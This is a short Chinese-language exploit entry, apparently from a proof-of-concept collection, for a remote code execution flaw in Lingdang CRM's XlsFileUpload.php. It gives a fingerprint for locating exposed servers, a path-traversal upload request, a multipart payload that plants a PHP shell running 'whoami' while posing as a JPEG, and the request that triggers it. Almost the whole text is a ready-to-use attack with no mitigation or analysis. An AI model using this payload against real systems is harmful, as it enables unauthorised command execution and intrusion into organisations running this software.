# 灵当CRMXlsFileUpload.php存在文件上传致RCE漏洞

- **系统**：灵当　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`POST /crm/modules/Products/haige/XlsFileUpload.php?frommodule=1/../../../../../&cur_module=1/../storage/rce HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lC…`

**请求体 / payload**
```
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="ImportXlsFile"; filename="1.php"
Content-Type: image/jpeg
<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundaryaKljzbg49Mq4ggLz--
GET /crm/storage/rce_haige.php HTTP/1.1
```
- **预期**：200　|　—